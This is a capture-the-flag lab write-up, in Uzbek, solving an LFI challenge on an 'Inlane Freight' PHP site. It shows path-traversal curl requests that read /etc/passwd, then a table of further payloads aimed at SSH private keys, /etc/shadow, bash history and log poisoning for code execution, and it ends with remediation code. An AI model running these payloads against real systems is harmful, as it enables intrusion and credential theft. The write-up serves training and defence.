# LFI — "Inlane Freight" (154.57.164.76:31038)

**Savol:** *"Using the file inclusion find the name of a user on the system that starts with 'b'."*
**Javob: `barry`** (uid=1000, `/home/barry`, real human account)

---

## 1. Recon — bu yerda nima bor?

```bash
curl -s -i http://154.57.164.76:31038/
```

Javob beradi:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

Sahifa — oddiy blog ("Inlane Freight"), lekin menyuda til almashtirish bor:

```html
<a href="index.php?language=en.php">English</a>
<a href="index.php?language=es.php">Spanish</a>
```

`language=` parametri fayl nomini **to'g'ridan-to'g'ri** qabul qilmoqda — bu klassik
**LFI (Local File Inclusion)** belgisi. Sayt PHP'da yozilgan, ya'ni orqa tomonda taxminan
shunday kod bor:

```php
include('languages/' . $_GET['language']);   // foydalanuvchi kiritishi tekshirilmaydi
```

## 2. LFI borligini tasdiqlash

To'g'ridan-to'g'ri `/etc/passwd` ishlamaydi (parametr oldiga `languages/` qo'shilyapti):

```bash
curl -s "http://154.57.164.76:31038/index.php?language=/etc/passwd"   # bo'sh chiqadi
```

Shuning uchun **path traversal** bilan yuqoriga chiqib ketamiz
(`../../../..` bilan `languages/` papkasidan ildizga chiqamiz):

```bash
curl -s "http://154.57.164.76:31038/index.php?language=../../../../etc/passwd"
```

Natija sahifaning "description" qismida `/etc/passwd` mazmuni bilan qaytadi:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
...
barry:x:1000:1000::/home/barry:/bin/sh      <-- shu yerdagi "b" harfli user
```

> Eslatma: `..%2f..%2f..%2f..%2fetc%2fpasswd` (URL-encoded) ham ishlaydi, chunki WAF/filtr
> yo'q. `php://filter`, `%00`, absolut `/etc/passwd` esa ishlamaydi — chunki dastur
> parametr oldiga papka nomini qo'shadi va `php://` wrapperi satr boshida turmaydi.

## 3. "b" harfi bilan boshlanadigan userlarni ajratish

```bash
curl -s "http://154.57.164.76:31038/index.php?language=../../../../etc/passwd" \
  | grep -oE '^[a-z_][a-z0-9_-]*:[^:]*:[0-9]+:[0-9]+' | grep '^b'
```

Natija:

```
backup:x:34:34      <- tizim akkaunti (system account, /var/backups, nologin)
barry:x:1000:1000   <- haqiqiy foydalanuvchi (uid >= 1000, home papkasi bor)
bin:x:2:2           <- tizim akkaunti (/bin)
```

**Farqni qanday ajratamiz:**
* `uid` 1000 va undan yuqori = **haqiqiy odam** (Linux'da birinchi oddiy user doim 1000).
* `uid` < 100 => tizim/service akkauntlari (`bin`, `backup`, `daemon` ...).
* `barry` uchun `/home/barry` home papkasi va `/bin/sh` shell bor, `backup`/`bin` esa
  `nologin`.

Demak challenge javobi: **`barry`**.

## 4. To'liq bir buyruqda

```bash
curl -s "http://154.57.164.76:31038/index.php?language=../../../../etc/passwd" \
  | grep -E '^[a-z_]+:x:[1-5][0-9]{3}:' | cut -d: -f1
# barry
```

## 5. Javobni tekshirish (submit)

Saytdagi "Write your answer" maydoniga **`barry`** deb yozib **Submit** qilinadi
(kichik harflar bilan, bo'sh joysiz).

## 6. Keyingi qadamlar (shu lab davom etsa)

LFI topilgach odatda shular sinaladi:

| Maqsad | Payload |
|---|---|
| `/etc/shadow` (root huquqi kerak, lekin ba'zi lablarda ochiq) | `../../../../etc/shadow` |
| Apache log orqali RCE | `../../../../var/log/apache2/access.log` (User-Agent'ga PHP yozish) |
| SSH kalitlari | `../../../../home/barry/.ssh/id_rsa` |
| Cron / konfiguratsiya | `../../../../etc/crontab`, `../../../../var/www/html/index.php` |
| Bash tarixi | `../../../../home/barry/.bash_history` |
| wrapper (bu yerda bloklangan) | `php://filter/convert.base64-encode/resource=index.php` |
| Log poisoning (agar log yozilsa) | `../../../../var/log/auth.log` / `apache2/access.log` |

## 7. Himoya (remediation) — qanday tuzatiladi

1. **Foydalanuvchi kiritishini fayl yo'li sifatida ishlatmang.** Allowlist ishlating:

```php
$allowed = ['en' => 'en.php', 'es' => 'es.php'];
$lang = $allowed[$_GET['language'] ?? 'en'] ?? 'en.php';
include __DIR__ . '/languages/' . $lang;
```

2. `basename()` + `realpath()` bilan tekshirish:

```php
$file = realpath(__DIR__ . '/languages/' . basename($_GET['language']));
if ($file === false || strpos($file, __DIR__ . '/languages/') !== 0) {
    http_response_code(400); exit('Invalid language');
}
include $file;
```

3. `open_basedir` ni web root bilan cheklash (php.ini):
   `open_basedir = /var/www/html`
4. `allow_url_include = Off` (wrapperlar orqali RCE oldini oladi).
5. `include`/`require` ga dinamik kiritishni umuman kamaytirish; `spl_autoload_register`dan foydalanish.

---

### Xulosa

* Zaiflik: `index.php?language=` parametrida **Local File Inclusion**.
* Exploit: `?language=../../../../etc/passwd` → tizim foydalanuvchilari ro'yxati.
* `"b"` harfi bilan boshlanadigan **haqiqiy** user: **`barry`** (`backup`, `bin` — tizim akkauntlari).
